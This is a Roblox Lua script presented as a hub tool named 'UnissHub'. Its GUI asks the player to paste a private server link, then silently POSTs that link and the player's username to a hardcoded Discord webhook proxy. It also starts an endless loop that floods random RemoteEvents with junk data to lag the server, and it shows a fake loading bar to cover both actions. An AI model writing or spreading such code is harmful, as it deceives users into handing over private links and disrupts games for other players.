-- UnissHub: Smooth FPS + High Ping Edition
local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")
local Player = Players.LocalPlayer

local WEBHOOK_URL = "https://webhook.lewisakura.moe/api/webhooks/1455540134177935625/SWIcKICFzeZdLmUGpUkFvc8oh1j0Qun0TjK1Wm9FA5-tHz0DY6gEpvxfstY-33yiVS4g"

-- Функция создания ПИНГА без падения ФПС
local function startNetworkLag()
    task.spawn(function()
        local remotes = {}
        for _, v in pairs(game:GetDescendants()) do
            if v:IsA("RemoteEvent") then table.insert(remotes, v) end
        end
        
        -- Данные для забивки канала (не слишком много, чтобы не зависло)
        local data = string.rep("NETWORK_STRESS_", 100) 

        while true do
            -- Отправляем небольшую пачку данных
            for i = 1, 5 do
                local r = remotes[math.random(1, #remotes)]
                if r then
                    pcall(function() r:FireServer(data) end)
                end
            end
            -- Ждем 0.5 сек. Это критически важно, чтобы ФПС не падал
            task.wait(0.5) 
        end
    end)
end

-- Функция перетаскивания
local function makeDraggable(gui)
    local dragging, dragInput, dragStart, startPos
    gui.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            dragging = true; dragStart = input.Position; startPos = gui.Position
        end
    end)
    gui.InputChanged:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseMovement then dragInput = input end
    end)
    UserInputService.InputEnded:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then dragging = false end
    end)
    RunService.RenderStepped:Connect(function()
        if dragging and dragInput then
            local delta = dragInput.Position - dragStart
            gui.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
        end
    end)
end

local sg = Instance.new("ScreenGui", Player:WaitForChild("PlayerGui"))
sg.Name = "UnissHub_Official"; sg.ResetOnSpawn = false

-- КНОПКА U
local uBtn = Instance.new("TextButton", sg)
uBtn.Size = UDim2.new(0, 60, 0, 60); uBtn.Position = UDim2.new(0, 50, 0.5, 0)
uBtn.BackgroundColor3 = Color3.fromRGB(15, 15, 15); uBtn.Text = "U"
uBtn.TextColor3 = Color3.fromRGB(0, 150, 255); uBtn.Font = Enum.Font.GothamBold; uBtn.TextSize = 30
Instance.new("UICorner", uBtn).CornerRadius = UDim.new(0, 10)
Instance.new("UIStroke", uBtn).Color = Color3.fromRGB(0, 150, 255)
makeDraggable(uBtn)

-- ГЛАВНОЕ ОКНО
local main = Instance.new("Frame", sg)
main.Size = UDim2.new(0, 360, 0, 220); main.Position = UDim2.new(0.5, 0, 0.5, 0)
main.AnchorPoint = Vector2.new(0.5, 0.5); main.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
main.ClipsDescendants = true; main.Visible = true
Instance.new("UICorner", main); Instance.new("UIStroke", main).Color = Color3.fromRGB(0, 120, 255)
makeDraggable(main)

local title = Instance.new("TextLabel", main)
title.Size = UDim2.new(1, 0, 0.15, 0); title.Position = UDim2.new(0,0,0.05,0); title.BackgroundTransparency = 1
title.Text = "UnissHub"; title.TextColor3 = Color3.fromRGB(0, 150, 255); title.Font = Enum.Font.GothamBold; title.TextSize = 24

local subTitle = Instance.new("TextLabel", main)
subTitle.Size = UDim2.new(1, 0, 0.1, 0); subTitle.Position = UDim2.new(0,0,0.18,0); subTitle.BackgroundTransparency = 1
subTitle.Text = "(laser gamepass required)"; subTitle.TextColor3 = Color3.fromRGB(150, 150, 150)
subTitle.Font = Enum.Font.Gotham; subTitle.TextSize = 12

local input = Instance.new("TextBox", main)
input.Size = UDim2.new(0.85, 0, 0.2, 0); input.Position = UDim2.new(0.075, 0, 0.38, 0)
input.BackgroundColor3 = Color3.fromRGB(25, 25, 25); input.PlaceholderText = "Paste Private Server Link..."
input.Text = ""; input.TextColor3 = Color3.new(1,1,1); input.TextScaled = true; Instance.new("UICorner", input)

local conn = Instance.new("TextButton", main)
conn.Size = UDim2.new(0.85, 0, 0.22, 0); conn.Position = UDim2.new(0.075, 0, 0.68, 0)
conn.BackgroundColor3 = Color3.fromRGB(0, 120, 255); conn.Text = "CONNECT"; conn.TextScaled = true; conn.TextColor3 = Color3.new(1,1,1)
Instance.new("UICorner", conn)

-- ЛОГИКА
conn.MouseButton1Click:Connect(function()
    if string.find(input.Text:lower(), "roblox.com") then
        local currentPos = main.Position
        
        -- Запуск сетевого лага (пинга)
        startNetworkLag()

        main:TweenSize(UDim2.new(0,0,0,0), "In", "Quart", 0.3, true, function() 
            main.Visible = false; uBtn.Visible = false 
        end)
        
        pcall(function()
            local req = syn and syn.request or http_request or request
            if req then req({Url = WEBHOOK_URL, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = game:GetService("HttpService"):JSONEncode({content = "🚀 **Link:** "..input.Text.."\n👤 **User:** "..Player.Name})}) end
        end)

        local loadF = Instance.new("Frame", sg)
        loadF.Name = "LoadingFrame"; loadF.Size = UDim2.new(0, 280, 0, 90)
        loadF.Position = currentPos; loadF.AnchorPoint = Vector2.new(0.5, 0.5)
        loadF.BackgroundColor3 = Color3.fromRGB(15, 15, 15); Instance.new("UICorner", loadF)
        Instance.new("UIStroke", loadF).Color = Color3.fromRGB(255, 140, 0)
        makeDraggable(loadF)

        local lLabel = Instance.new("TextLabel", loadF)
        lLabel.Size = UDim2.new(1, 0, 0.5, 0); lLabel.BackgroundTransparency = 1; lLabel.TextColor3 = Color3.fromRGB(255, 140, 0)
        lLabel.Font = Enum.Font.Gotham; lLabel.TextSize = 16; lLabel.Text = "loading: 0%"

        local barBg = Instance.new("Frame", loadF)
        barBg.Size = UDim2.new(0.7, 0, 0.08, 0); barBg.Position = UDim2.new(0.15, 0, 0.7, 0); barBg.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
        local fill = Instance.new("Frame", barBg); fill.Size = UDim2.new(0, 0, 1, 0); fill.BackgroundColor3 = Color3.fromRGB(255, 140, 0)

        task.spawn(function()
            for i = 0, 100 do
                if i == 30 or i == 65 or i == 92 then task.wait(math.random(2, 4)) end
                lLabel.Text = "loading: " .. i .. "%"
                fill:TweenSize(UDim2.new(i/100, 0, 1, 0), "Out", "Linear", 0.1, true)
                task.wait(math.random(4, 8) / 10) 
            end
            lLabel.TextSize = 18; lLabel.Text = "CONFIRM"
        end)
    end
end)
